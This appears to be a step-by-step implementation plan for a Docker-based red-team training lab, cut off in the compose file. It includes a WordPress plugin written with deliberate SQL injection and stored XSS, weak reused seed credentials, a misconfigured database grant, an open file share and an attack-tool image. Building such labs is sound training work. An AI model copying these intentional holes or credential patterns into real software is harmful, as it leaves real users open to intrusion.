# Red Team Training Lab Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a scalable Docker-based red team training environment with SQL injection, SSH brute force, and browser exploitation attack paths.

**Architecture:** Docker Compose with per-student network isolation. Core services containerized, RouterOS and Windows DC as VM templates. Deploy script manages student lifecycle.

**Tech Stack:** Docker, Docker Compose, Alpine, Ubuntu, Kali Linux, WordPress, MySQL, BeEF, Samba, Packer, MikroTik RouterOS CHR, Windows Server 2019

---

## Phase 1: Project Foundation

### Task 1: Create Directory Structure

**Files:**
- Create: `infrastructure/kali/.gitkeep`
- Create: `infrastructure/redirector/.gitkeep`
- Create: `infrastructure/wordpress/.gitkeep`
- Create: `infrastructure/fileserver/.gitkeep`
- Create: `infrastructure/workstation/.gitkeep`
- Create: `vms/routeros/.gitkeep`
- Create: `vms/windows/.gitkeep`
- Create: `config/.gitkeep`

**Step 1: Create all directories**

```bash
mkdir -p infrastructure/{kali,redirector,wordpress,fileserver,workstation}
mkdir -p vms/{routeros,windows}
mkdir -p config
touch infrastructure/{kali,redirector,wordpress,fileserver,workstation}/.gitkeep
touch vms/{routeros,windows}/.gitkeep
touch config/.gitkeep
```

**Step 2: Verify structure**

Run: `find . -type d | grep -v .git | sort`
Expected: All directories present

**Step 3: Commit**

```bash
git add -A && git commit -m "chore: create project directory structure"
```

---

### Task 2: Create Seed Credentials Configuration

**Files:**
- Create: `config/credentials.yml`

**Step 1: Create credentials file**

These credentials will be seeded across systems to enable credential reuse attacks.

```yaml
# config/credentials.yml
# Seed credentials for the training environment
# These are intentionally weak and reused across systems

wordpress:
  admin:
    username: admin
    password: "Acme2024!"
    email: admin@acmewidgets.local

  users:
    - username: jsmith
      password: "Summer2024"
      email: jsmith@acmewidgets.local
      role: editor
    - username: mwilliams
      password: "Welcome123"
      email: mwilliams@acmewidgets.local
      role: author

mysql:
  root_password: "r00tdb2024!"
  wordpress_db: wordpress
  wordpress_user: wp_user
  wordpress_password: "Acme2024!"

ssh:
  # Same as WordPress admin - credential reuse vulnerability
  webserver_user: admin
  webserver_password: "Acme2024!"

vpn:
  # L2TP credentials - reused from WordPress
  psk: "AcmeVPN2024"
  users:
    - username: jsmith
      password: "Summer2024"
    - username: mwilliams
      password: "Welcome123"

routeros:
  admin_user: admin
  admin_password: "Mikr0t1k!"
  # Secondary account with weak creds for brute force
  backup_user: backup
  backup_password: "backup123"

active_directory:
  domain: acmewidgets.local
  netbios: ACME
  admin_password: "Adm1n2024!"

  users:
    - username: jsmith
      password: "Summer2024"
      groups: ["Domain Users", "IT Support"]
    - username: mwilliams
      password: "Welcome123"
      groups: ["Domain Users", "Accounting"]
    - username: svc_backup
      password: "Backup2024!"
      groups: ["Domain Users", "Backup Operators"]
      # This service account has DCSync rights - misconfiguration
```

**Step 2: Verify YAML syntax**

Run: `python3 -c "import yaml; yaml.safe_load(open('config/credentials.yml'))"`
Expected: No output (valid YAML)

**Step 3: Commit**

```bash
git add config/credentials.yml && git commit -m "config: add seed credentials for attack scenarios"
```

---

## Phase 2: Attacker Infrastructure

### Task 3: Build Redirector Image

**Files:**
- Create: `infrastructure/redirector/Dockerfile`
- Create: `infrastructure/redirector/entrypoint.sh`

**Step 1: Create Dockerfile**

```dockerfile
# infrastructure/redirector/Dockerfile
FROM alpine:3.19

RUN apk add --no-cache \
    socat \
    nginx \
    iptables \
    tcpdump \
    bash

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 80 443 8080 4444 5555

ENTRYPOINT ["/entrypoint.sh"]
CMD ["socat", "-v", "TCP-LISTEN:8080,fork,reuseaddr", "TCP:target:80"]
```

**Step 2: Create entrypoint script**

```bash
#!/bin/bash
# infrastructure/redirector/entrypoint.sh

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

# If REDIRECT_CONFIG is set, parse and create socat listeners
if [ -n "$REDIRECT_CONFIG" ]; then
    IFS=',' read -ra REDIRECTS <<< "$REDIRECT_CONFIG"
    for redirect in "${REDIRECTS[@]}"; do
        IFS=':' read -r listen_port target_host target_port <<< "$redirect"
        echo "Redirecting port $listen_port -> $target_host:$target_port"
        socat TCP-LISTEN:$listen_port,fork,reuseaddr TCP:$target_host:$target_port &
    done
fi

# Run the main command
exec "$@"
```

**Step 3: Build and test image**

Run: `docker build -t redteam-lab/redirector:latest infrastructure/redirector/`
Expected: Successfully built

**Step 4: Test container starts**

Run: `docker run --rm -d --name test-redirector redteam-lab/redirector:latest sleep 30 && docker exec test-redirector socat -V && docker stop test-redirector`
Expected: socat version output

**Step 5: Commit**

```bash
git add infrastructure/redirector/ && git commit -m "feat: add redirector container with socat"
```

---

### Task 4: Build Kali Attack Box Image

**Files:**
- Create: `infrastructure/kali/Dockerfile`
- Create: `infrastructure/kali/tools.sh`

**Step 1: Create Dockerfile**

```dockerfile
# infrastructure/kali/Dockerfile
FROM kalilinux/kali-rolling:latest

ENV DEBIAN_FRONTEND=noninteractive

# Update and install core tools
RUN apt-get update && apt-get install -y \
    # Network tools
    nmap \
    netcat-openbsd \
    tcpdump \
    wireshark-common \
    proxychains4 \
    # Web exploitation
    sqlmap \
    nikto \
    dirb \
    gobuster \
    # Password attacks
    hydra \
    hashcat \
    john \
    wordlists \
    # Exploitation frameworks
    metasploit-framework \
    # AD tools
    bloodhound \
    neo4j \
    crackmapexec \
    impacket-scripts \
    python3-impacket \
    # General
    vim \
    tmux \
    git \
    curl \
    wget \
    openssh-client \
    sshpass \
    python3-pip \
    # VPN client
    xl2tpd \
    strongswan \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Install BeEF
RUN apt-get update && apt-get install -y beef-xss && apt-get clean

# Install additional Python tools
RUN pip3 install --break-system-packages \
    pwntools \
    requests \
    beautifulsoup4

# Create working directories
RUN mkdir -p /opt/loot /opt/tools /opt/scripts

# Copy custom scripts
COPY tools.sh /opt/tools/setup.sh
RUN chmod +x /opt/tools/setup.sh

WORKDIR /root

# Keep container running
CMD ["tail", "-f", "/dev/null"]
```

**Step 2: Create tools setup script**

```bash
#!/bin/bash
# infrastructure/kali/tools.sh

echo "[*] Red Team Lab - Kali Attack Box"
echo "[*] Available tools:"
echo "    - sqlmap: SQL injection"
echo "    - hydra: Password brute force"
echo "    - hashcat/john: Hash cracking"
echo "    - msfconsole: Metasploit"
echo "    - beef-xss: Browser exploitation"
echo "    - impacket-*: AD attacks"
echo "    - crackmapexec: AD enumeration"
echo ""
echo "[*] Loot directory: /opt/loot"
echo "[*] Wordlists: /usr/share/wordlists/"
echo ""
echo "[*] VPN connection:"
echo "    Edit /etc/ipsec.conf and /etc/xl2tpd/xl2tpd.conf"
echo "    Then: ipsec start && echo 'c vpn' > /var/run/xl2tpd/l2tp-control"
```

**Step 3: Build image (this takes a while)**

Run: `docker build -t redteam-lab/kali:latest infrastructure/kali/`
Expected: Successfully built (may take 10-15 minutes)

**Step 4: Test key tools exist**

Run: `docker run --rm redteam-lab/kali:latest which sqlmap hydra nmap`
Expected: Paths to all three tools

**Step 5: Commit**

```bash
git add infrastructure/kali/ && git commit -m "feat: add Kali attack box with exploitation tools"
```

---

## Phase 3: Victim Infrastructure - DMZ

### Task 5: Create Vulnerable WordPress Plugin

**Files:**
- Create: `infrastructure/wordpress/vulnerable-plugin/acme-employee-portal/acme-employee-portal.php`

**Step 1: Create vulnerable plugin**

This plugin has intentional SQL injection and stored XSS vulnerabilities.

```php
<?php
/**
 * Plugin Name: Acme Employee Portal
 * Description: Internal employee directory and resources
 * Version: 1.0.0
 * Author: Acme Widgets IT
 */

// Prevent direct access
if (!defined('ABSPATH')) exit;

// Create database table on activation
register_activation_hook(__FILE__, 'acme_portal_activate');

function acme_portal_activate() {
    global $wpdb;
    $table = $wpdb->prefix . 'acme_employees';

    $sql = "CREATE TABLE IF NOT EXISTS $table (
        id INT AUTO_INCREMENT PRIMARY KEY,
        employee_id VARCHAR(20) NOT NULL,
        full_name VARCHAR(100) NOT NULL,
        department VARCHAR(50),
        email VARCHAR(100),
        phone VARCHAR(20),
        notes TEXT,
        vpn_username VARCHAR(50),
        vpn_password VARCHAR(100),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);

    // Seed with employee data including VPN creds
    $wpdb->insert($table, array(
        'employee_id' => 'EMP001',
        'full_name' => 'John Smith',
        'department' => 'IT Support',
        'email' => 'jsmith@acmewidgets.local',
        'phone' => '555-0101',
        'notes' => 'IT admin, has server access',
        'vpn_username' => 'jsmith',
        'vpn_password' => 'Summer2024'
    ));

    $wpdb->insert($table, array(
        'employee_id' => 'EMP002',
        'full_name' => 'Mary Williams',
        'department' => 'Accounting',
        'email' => 'mwilliams@acmewidgets.local',
        'phone' => '555-0102',
        'notes' => 'Handles payroll',
        'vpn_username' => 'mwilliams',
        'vpn_password' => 'Welcome123'
    ));

    $wpdb->insert($table, array(
        'employee_id' => 'EMP003',
        'full_name' => 'Backup Service',
        'department' => 'IT',
        'email' => 'svc_backup@acmewidgets.local',
        'phone' => '',
        'notes' => 'Service account for backups - DO NOT DELETE',
        'vpn_username' => 'svc_backup',
        'vpn_password' => 'Backup2024!'
    ));
}

// Add shortcode for employee directory
add_shortcode('employee_directory', 'acme_employee_directory');

function acme_employee_directory($atts) {
    global $wpdb;
    $table = $wpdb->prefix . 'acme_employees';

    $output = '<div class="acme-employee-directory">';
    $output .= '<h2>Employee Directory</h2>';
    $output .= '<form method="GET" action="">';
    $output .= '<input type="text" name="search" placeholder="Search employees..." value="' . esc_attr($_GET['search'] ?? '') . '">';
    $output .= '<button type="submit">Search</button>';
    $output .= '</form>';

    // VULNERABLE: SQL Injection via search parameter
    // The search parameter is directly concatenated into the query
    $search = $_GET['search'] ?? '';

    if (!empty($search)) {
        // INTENTIONALLY VULNERABLE - DO NOT FIX
        $query = "SELECT id, employee_id, full_name, department, email, phone FROM $table WHERE full_name LIKE '%$search%' OR department LIKE '%$search%' OR employee_id LIKE '%$search%'";
    } else {
        $query = "SELECT id, employee_id, full_name, department, email, phone FROM $table";
    }

    $employees = $wpdb->get_results($query);

    if ($employees) {
        $output .= '<table class="employee-table">';
        $output .= '<tr><th>ID</th><th>Name</th><th>Department</th><th>Email</th><th>Phone</th></tr>';

        foreach ($employees as $emp) {
            // VULNERABLE: Stored XSS via notes field (shown in detail view)
            $output .= '<tr>';
            $output .= '<td>' . esc_html($emp->employee_id) . '</td>';
            $output .= '<td><a href="?employee_id=' . $emp->id . '">' . esc_html($emp->full_name) . '</a></td>';
            $output .= '<td>' . esc_html($emp->department) . '</td>';
            $output .= '<td>' . esc_html($emp->email) . '</td>';
            $output .= '<td>' . esc_html($emp->phone) . '</td>';
            $output .= '</tr>';
        }
        $output .= '</table>';
    } else {
        $output .= '<p>No employees found.</p>';
    }

    // Employee detail view
    if (isset($_GET['employee_id'])) {
        // VULNERABLE: SQL Injection in employee_id parameter
        $emp_id = $_GET['employee_id'];
        $detail_query = "SELECT * FROM $table WHERE id = $emp_id";
        $employee = $wpdb->get_row($detail_query);

        if ($employee) {
            $output .= '<div class="employee-detail">';
            $output .= '<h3>Employee Details</h3>';
            $output .= '<p><strong>Name:</strong> ' . esc_html($employee->full_name) . '</p>';
            $output .= '<p><strong>Department:</strong> ' . esc_html($employee->department) . '</p>';
            $output .= '<p><strong>Email:</strong> ' . esc_html($employee->email) . '</p>';
            // VULNERABLE: XSS - notes field not escaped
            $output .= '<p><strong>Notes:</strong> ' . $employee->notes . '</p>';
            $output .= '</div>';
        }
    }

    $output .= '</div>';
    return $output;
}

// Add admin page to manage employees
add_action('admin_menu', 'acme_portal_admin_menu');

function acme_portal_admin_menu() {
    add_menu_page(
        'Employee Portal',
        'Employees',
        'manage_options',
        'acme-employees',
        'acme_portal_admin_page',
        'dashicons-groups'
    );
}

function acme_portal_admin_page() {
    global $wpdb;
    $table = $wpdb->prefix . 'acme_employees';

    // Handle form submission (also vulnerable to SQLi)
    if ($_POST['action'] ?? '' === 'add_employee') {
        $wpdb->insert($table, array(
            'employee_id' => sanitize_text_field($_POST['employee_id']),
            'full_name' => sanitize_text_field($_POST['full_name']),
            'department' => sanitize_text_field($_POST['department']),
            'email' => sanitize_email($_POST['email']),
            'phone' => sanitize_text_field($_POST['phone']),
            'notes' => $_POST['notes'], // VULNERABLE: No sanitization for XSS
            'vpn_username' => sanitize_text_field($_POST['vpn_username']),
            'vpn_password' => $_POST['vpn_password'] // Stored in plaintext - bad practice
        ));
        echo '<div class="notice notice-success"><p>Employee added!</p></div>';
    }

    $employees = $wpdb->get_results("SELECT * FROM $table");

    ?>
    <div class="wrap">
        <h1>Acme Employee Portal</h1>

        <h2>Add Employee</h2>
        <form method="POST">
            <input type="hidden" name="action" value="add_employee">
            <table class="form-table">
                <tr><td>Employee ID:</td><td><input type="text" name="employee_id" required></td></tr>
                <tr><td>Full Name:</td><td><input type="text" name="full_name" required></td></tr>
                <tr><td>Department:</td><td><input type="text" name="department"></td></tr>
                <tr><td>Email:</td><td><input type="email" name="email"></td></tr>
                <tr><td>Phone:</td><td><input type="text" name="phone"></td></tr>
                <tr><td>Notes:</td><td><textarea name="notes"></textarea></td></tr>
                <tr><td>VPN Username:</td><td><input type="text" name="vpn_username"></td></tr>
                <tr><td>VPN Password:</td><td><input type="text" name="vpn_password"></td></tr>
            </table>
            <button type="submit" class="button button-primary">Add Employee</button>
        </form>

        <h2>Current Employees</h2>
        <table class="wp-list-table widefat fixed striped">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Name</th>
                    <th>Department</th>
                    <th>Email</th>
                    <th>VPN User</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($employees as $emp): ?>
                <tr>
                    <td><?php echo esc_html($emp->employee_id); ?></td>
                    <td><?php echo esc_html($emp->full_name); ?></td>
                    <td><?php echo esc_html($emp->department); ?></td>
                    <td><?php echo esc_html($emp->email); ?></td>
                    <td><?php echo esc_html($emp->vpn_username); ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <?php
}

// Add some basic CSS
add_action('wp_head', 'acme_portal_styles');

function acme_portal_styles() {
    ?>
    <style>
        .acme-employee-directory { max-width: 900px; margin: 20px auto; }
        .acme-employee-directory form { margin-bottom: 20px; }
        .acme-employee-directory input[type="text"] { padding: 8px; width: 300px; }
        .acme-employee-directory button { padding: 8px 16px; }
        .employee-table { width: 100%; border-collapse: collapse; }
        .employee-table th, .employee-table td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        .employee-table th { background: #f5f5f5; }
        .employee-table tr:hover { background: #f9f9f9; }
        .employee-detail { margin-top: 20px; padding: 20px; background: #f5f5f5; border-radius: 5px; }
    </style>
    <?php
}
```

**Step 2: Verify PHP syntax**

Run: `php -l infrastructure/wordpress/vulnerable-plugin/acme-employee-portal/acme-employee-portal.php`
Expected: `No syntax errors detected`

**Step 3: Commit**

```bash
git add infrastructure/wordpress/vulnerable-plugin/ && git commit -m "feat: add vulnerable WordPress plugin with SQLi and XSS"
```

---

### Task 6: Build WordPress Container

**Files:**
- Create: `infrastructure/wordpress/Dockerfile`
- Create: `infrastructure/wordpress/setup-wordpress.sh`
- Create: `infrastructure/wordpress/wp-config-docker.php`

**Step 1: Create Dockerfile**

```dockerfile
# infrastructure/wordpress/Dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Install Apache, PHP, MySQL client, SSH
RUN apt-get update && apt-get install -y \
    apache2 \
    php \
    php-mysql \
    php-gd \
    php-xml \
    php-mbstring \
    php-curl \
    libapache2-mod-php \
    mysql-client \
    curl \
    wget \
    unzip \
    openssh-server \
    sudo \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Configure SSH
RUN mkdir /var/run/sshd
RUN echo 'PermitRootLogin no' >> /etc/ssh/sshd_config
RUN echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

# Create admin user (password set via environment variable)
RUN useradd -m -s /bin/bash admin && \
    usermod -aG sudo admin

# Download WordPress
RUN cd /tmp && \
    wget -q https://wordpress.org/latest.tar.gz && \
    tar -xzf latest.tar.gz && \
    cp -r wordpress/* /var/www/html/ && \
    rm -rf /tmp/wordpress /tmp/latest.tar.gz && \
    rm /var/www/html/index.html

# Copy vulnerable plugin
COPY vulnerable-plugin/acme-employee-portal /var/www/html/wp-content/plugins/acme-employee-portal

# Set permissions
RUN chown -R www-data:www-data /var/www/html && \
    chmod -R 755 /var/www/html

# Copy configuration and setup scripts
COPY wp-config-docker.php /var/www/html/wp-config.php
COPY setup-wordpress.sh /setup-wordpress.sh
RUN chmod +x /setup-wordpress.sh

# Enable Apache modules
RUN a2enmod rewrite

EXPOSE 80 22

CMD ["/setup-wordpress.sh"]
```

**Step 2: Create wp-config**

```php
<?php
// infrastructure/wordpress/wp-config-docker.php

define('DB_NAME', getenv('WORDPRESS_DB_NAME') ?: 'wordpress');
define('DB_USER', getenv('WORDPRESS_DB_USER') ?: 'wp_user');
define('DB_PASSWORD', getenv('WORDPRESS_DB_PASSWORD') ?: 'Acme2024!');
define('DB_HOST', getenv('WORDPRESS_DB_HOST') ?: 'mysql');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');

// Unique keys - in production, generate these
define('AUTH_KEY',         'redteam-lab-auth-key-change-in-prod');
define('SECURE_AUTH_KEY',  'redteam-lab-secure-auth-key');
define('LOGGED_IN_KEY',    'redteam-lab-logged-in-key');
define('NONCE_KEY',        'redteam-lab-nonce-key');
define('AUTH_SALT',        'redteam-lab-auth-salt');
define('SECURE_AUTH_SALT', 'redteam-lab-secure-auth-salt');
define('LOGGED_IN_SALT',   'redteam-lab-logged-in-salt');
define('NONCE_SALT',       'redteam-lab-nonce-salt');

$table_prefix = 'wp_';

define('WP_DEBUG', false);

if (!defined('ABSPATH')) {
    define('ABSPATH', __DIR__ . '/');
}

require_once ABSPATH . 'wp-settings.php';
```

**Step 3: Create setup script**

```bash
#!/bin/bash
# infrastructure/wordpress/setup-wordpress.sh

# Set admin password from environment
if [ -n "$SSH_ADMIN_PASSWORD" ]; then
    echo "admin:$SSH_ADMIN_PASSWORD" | chpasswd
fi

# Start SSH
service ssh start

# Wait for MySQL to be ready
echo "Waiting for MySQL..."
until mysql -h "${WORDPRESS_DB_HOST:-mysql}" -u "${WORDPRESS_DB_USER:-wp_user}" -p"${WORDPRESS_DB_PASSWORD:-Acme2024!}" -e "SELECT 1" &>/dev/null; do
    sleep 2
done
echo "MySQL is ready!"

# Install WordPress if not already installed
if ! $(wp core is-installed --path=/var/www/html --allow-root 2>/dev/null); then
    # Install WP-CLI
    curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
    chmod +x wp-cli.phar
    mv wp-cli.phar /usr/local/bin/wp

    # Install WordPress
    wp core install \
        --path=/var/www/html \
        --url="${WORDPRESS_URL:-http://localhost}" \
        --title="Acme Widgets Inc." \
        --admin_user="${WP_ADMIN_USER:-admin}" \
        --admin_password="${WP_ADMIN_PASSWORD:-Acme2024!}" \
        --admin_email="admin@acmewidgets.local" \
        --allow-root

    # Create additional users
    wp user create jsmith jsmith@acmewidgets.local \
        --role=editor \
        --user_pass="Summer2024" \
        --path=/var/www/html \
        --allow-root

    wp user create mwilliams mwilliams@acmewidgets.local \
        --role=author \
        --user_pass="Welcome123" \
        --path=/var/www/html \
        --allow-root

    # Activate vulnerable plugin
    wp plugin activate acme-employee-portal --path=/var/www/html --allow-root

    # Create a page with the employee directory shortcode
    wp post create \
        --post_type=page \
        --post_title='Employee Directory' \
        --post_content='[employee_directory]' \
        --post_status=publish \
        --path=/var/www/html \
        --allow-root

    echo "WordPress installation complete!"
fi

# Start Apache in foreground
exec apache2ctl -D FOREGROUND
```

**Step 4: Build image**

Run: `docker build -t redteam-lab/wordpress:latest infrastructure/wordpress/`
Expected: Successfully built

**Step 5: Commit**

```bash
git add infrastructure/wordpress/ && git commit -m "feat: add WordPress container with vulnerable plugin"
```

---

### Task 7: Create MySQL Container Configuration

**Files:**
- Create: `infrastructure/wordpress/mysql-init.sql`

**Step 1: Create MySQL init script**

```sql
-- infrastructure/wordpress/mysql-init.sql

-- Create WordPress database
CREATE DATABASE IF NOT EXISTS wordpress;

-- Create WordPress user
CREATE USER IF NOT EXISTS 'wp_user'@'%' IDENTIFIED BY 'Acme2024!';
GRANT ALL PRIVILEGES ON wordpress.* TO 'wp_user'@'%';

-- Create a 'secrets' database with additional credentials (for SQLi discovery)
CREATE DATABASE IF NOT EXISTS secrets;

CREATE TABLE IF NOT EXISTS secrets.admin_accounts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    service VARCHAR(50),
    username VARCHAR(50),
    password VARCHAR(100),
    notes TEXT
);

-- Seed with sensitive data that SQLi can dump
INSERT INTO secrets.admin_accounts (service, username, password, notes) VALUES
('RouterOS', 'admin', 'Mikr0t1k!', 'Main router admin - do not share'),
('RouterOS', 'backup', 'backup123', 'Backup account'),
('Domain Admin', 'Administrator', 'Adm1n2024!', 'AD domain admin'),
('Backup Service', 'svc_backup', 'Backup2024!', 'Has DCSync rights');

-- Grant wp_user access to secrets (misconfiguration)
GRANT SELECT ON secrets.* TO 'wp_user'@'%';

FLUSH PRIVILEGES;
```

**Step 2: Verify SQL syntax**

Run: `echo "SELECT 1;" | cat infrastructure/wordpress/mysql-init.sql - | head -5`
Expected: First lines of the SQL file

**Step 3: Commit**

```bash
git add infrastructure/wordpress/mysql-init.sql && git commit -m "feat: add MySQL init script with secrets database"
```

---

## Phase 4: Victim Infrastructure - Internal

### Task 8: Build File Server Container

**Files:**
- Create: `infrastructure/fileserver/Dockerfile`
- Create: `infrastructure/fileserver/smb.conf`
- Create: `infrastructure/fileserver/entrypoint.sh`
- Create: `infrastructure/fileserver/sensitive-data/`

**Step 1: Create Dockerfile**

```dockerfile
# infrastructure/fileserver/Dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    samba \
    samba-common \
    smbclient \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Create directories
RUN mkdir -p /srv/samba/public /srv/samba/sensitive /srv/samba/accounting

# Copy config
COPY smb.conf /etc/samba/smb.conf
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Create sensitive files
COPY sensitive-data/ /srv/samba/sensitive/

# Set permissions
RUN chmod -R 777 /srv/samba

EXPOSE 139 445

ENTRYPOINT ["/entrypoint.sh"]
```

**Step 2: Create Samba config**

```ini
# infrastructure/fileserver/smb.conf
[global]
   workgroup = ACME
   server string = Acme File Server
   security = user
   map to guest = Bad User
   dns proxy = no
   log file = /var/log/samba/log.%m
   max log size = 1000

[public]
   path = /srv/samba/public
   browsable = yes
   writable = yes
   guest ok = yes
   read only = no

[sensitive]
   path = /srv/samba/sensitive
   browsable = yes
   writable = yes
   guest ok = no
   valid users = admin, svc_backup
   read only = no
   comment = Sensitive Business Documents - Authorized Personnel Only

[accounting]
   path = /srv/samba/accounting
   browsable = yes
   writable = yes
   guest ok = no
   valid users = admin, mwilliams, svc_backup
   read only = no
```

**Step 3: Create entrypoint**

```bash
#!/bin/bash
# infrastructure/fileserver/entrypoint.sh

# Create Samba users from environment or defaults
create_smb_user() {
    local user=$1
    local pass=$2
    useradd -M -s /sbin/nologin "$user" 2>/dev/null || true
    echo -e "$pass\n$pass" | smbpasswd -a -s "$user"
}

# Create default users matching AD credentials
create_smb_user "admin" "${ADMIN_PASSWORD:-Acme2024!}"
create_smb_user "jsmith" "${JSMITH_PASSWORD:-Summer2024}"
create_smb_user "mwilliams" "${MWILLIAMS_PASSWORD:-Welcome123}"
create_smb_user "svc_backup" "${SVCBACKUP_PASSWORD:-Backup2024!}"

# Start Samba
exec smbd --foreground --no-process-group
```

**Step 4: Create sensitive data files**

```bash
mkdir -p infrastructure/fileserver/sensitive-data
```

```text
# infrastructure/fileserver/sensitive-data/secret-formula.txt
ACME WIDGETS PROPRIETARY FORMULA
================================

DO NOT DISTRIBUTE - TRADE SECRET

Widget Compound X-42 Recipe:
- 3 parts unobtanium
- 2 parts vibranium
- 1 part adamantium
- Heat to 3000°C

This formula is worth $10M to competitors.

Last updated: 2024-01-15
Authorized viewers: CEO, CTO only
```

```text
# infrastructure/fileserver/sensitive-data/employee-ssn.csv
employee_id,full_name,ssn,salary
EMP001,John Smith,123-45-6789,$85000
EMP002,Mary Williams,234-56-7890,$72000
EMP003,Bob Johnson,345-67-8901,$95000
EMP004,Alice Brown,456-78-9012,$68000
```

```text
# infrastructure/fileserver/sensitive-data/passwords.txt
=== ACME INTERNAL PASSWORD LIST ===
DO NOT SHARE OUTSIDE IT DEPARTMENT

Server Room Door: 4521
WiFi Password: AcmeGuest2024
VPN PSK: AcmeVPN2024
Backup Encryption: BackupKey2024!

Domain Admin (emergency): Adm1n2024!
```

**Step 5: Build image**

Run: `docker build -t redteam-lab/fileserver:latest infrastructure/fileserver/`
Expected: Successfully built

**Step 6: Commit**

```bash
git add infrastructure/fileserver/ && git commit -m "feat: add Samba file server with sensitive data"
```

---

### Task 9: Build Workstation Container (BeEF Victim)

**Files:**
- Create: `infrastructure/workstation/Dockerfile`
- Create: `infrastructure/workstation/browse-script.py`
- Create: `infrastructure/workstation/entrypoint.sh`

**Step 1: Create Dockerfile**

```dockerfile
# infrastructure/workstation/Dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    firefox \
    python3 \
    python3-pip \
    xvfb \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Install Selenium
RUN pip3 install selenium webdriver-manager

# Install geckodriver
RUN apt-get update && apt-get install -y wget && \
    wget -q https://github.com/mozilla/geckodriver/releases/download/v0.33.0/geckodriver-v0.33.0-linux64.tar.gz && \
    tar -xzf geckodriver-v0.33.0-linux64.tar.gz && \
    mv geckodriver /usr/local/bin/ && \
    rm geckodriver-v0.33.0-linux64.tar.gz && \
    apt-get clean

COPY browse-script.py /browse-script.py
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh /browse-script.py

ENTRYPOINT ["/entrypoint.sh"]
```

**Step 2: Create browse script**

```python
#!/usr/bin/env python3
# infrastructure/workstation/browse-script.py
"""
Simulates an employee browsing the company WordPress site.
This will trigger BeEF hooks if the attacker has injected them.
"""

import os
import time
import random
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By

def get_browser():
    options = Options()
    options.add_argument('--headless')
    service = Service('/usr/local/bin/geckodriver')
    return webdriver.Firefox(options=options, service=service)

def browse_wordpress():
    wordpress_url = os.environ.get('WORDPRESS_URL', 'http://wordpress')

    print(f"[*] Starting simulated browsing to {wordpress_url}")

    browser = get_browser()

    try:
        # Visit homepage
        print(f"[*] Visiting homepage...")
        browser.get(wordpress_url)
        time.sleep(random.uniform(2, 5))

        # Visit employee directory (where XSS payload might be)
        print(f"[*] Visiting employee directory...")
        browser.get(f"{wordpress_url}/employee-directory/")
        time.sleep(random.uniform(3, 8))

        # Click around
        try:
            links = browser.find_elements(By.TAG_NAME, 'a')
            if links:
                link = random.choice(links[:5])  # Click one of first 5 links
                link.click()
                time.sleep(random.uniform(2, 5))
        except Exception as e:
            print(f"[!] Error clicking: {e}")

        # Search for something
        print(f"[*] Searching employee directory...")
        browser.get(f"{wordpress_url}/employee-directory/?search=IT")
        time.sleep(random.uniform(3, 6))

    except Exception as e:
        print(f"[!] Browser error: {e}")
    finally:
        browser.quit()

def main():
    interval = int(os.environ.get('BROWSE_INTERVAL', '60'))

    print(f"[*] Workstation simulation started")
    print(f"[*] Browse interval: {interval} seconds")

    while True:
        try:
            browse_wordpress()
        except Exception as e:
            print(f"[!] Error in browse cycle: {e}")

        sleep_time = interval + random.randint(-10, 10)
        print(f"[*] Sleeping {sleep_time} seconds...")
        time.sleep(sleep_time)

if __name__ == '__main__':
    main()
```

**Step 3: Create entrypoint**

```bash
#!/bin/bash
# infrastructure/workstation/entrypoint.sh

# Start virtual display
export DISPLAY=:99
Xvfb :99 -screen 0 1024x768x24 &
sleep 2

# Wait for WordPress to be ready
echo "[*] Waiting for WordPress to be available..."
until curl -s "${WORDPRESS_URL:-http://wordpress}" > /dev/null; do
    sleep 5
done
echo "[*] WordPress is up!"

# Start browsing simulation
exec python3 /browse-script.py
```

**Step 4: Build image**

Run: `docker build -t redteam-lab/workstation:latest infrastructure/workstation/`
Expected: Successfully built

**Step 5: Commit**

```bash
git add infrastructure/workstation/ && git commit -m "feat: add workstation container with automated browsing"
```

---

## Phase 5: Docker Compose Orchestration

### Task 10: Create Docker Compose Template

**Files:**
- Create: `docker-compose.yml`
- Create: `.env.template`

**Step 1: Create docker-compose.yml**

```yaml
# docker-compose.yml
# Red Team Training Lab - Student Environment Template
# Usage: STUDENT_ID=01 docker-compose up -d

version: '3.8'

networks:
  internet:
    driver: bridge
    ipam:
      config:
        - subnet: 10.${STUDENT_ID:-99}.0.0/24
  dmz:
    driver: bridge
    ipam:
      config:
        - subnet: 10.${STUDENT_ID:-99}.1.0/24
  internal:
    driver: bridge
    ipam:
      config:
        - subnet: 10.${STUDENT_ID:-99}.2.0/24

services:
  # === ATTACKER INFRASTRUCTURE ===

  kali:
    image: redteam-lab/kali:latest
    build: ./infrastructure/kali
    container_name: student${STUDENT_ID:-99}-kali
    hostname: kali
    networks:
      internet:
        ipv4_address: 10.${STUDENT_ID:-99}.0.10
    volumes:
      - kali-home:/root
      - ./config:/opt/lab-config:ro
    ports:
